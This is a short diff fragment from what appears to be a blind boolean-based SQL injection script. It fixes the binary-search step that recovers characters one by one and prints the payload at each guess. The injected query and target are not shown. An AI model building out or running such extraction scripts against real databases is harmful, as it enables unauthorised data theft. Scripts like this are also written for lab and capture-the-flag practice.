@@ -22,7 +22,7 @@ def sql_bool():
                 high = mid
             mid = (low + high)//2
             print(payload)
-        req = req + chr(mid)
+        req = req + chr(low)
         print(req)
 sql_bool()
 
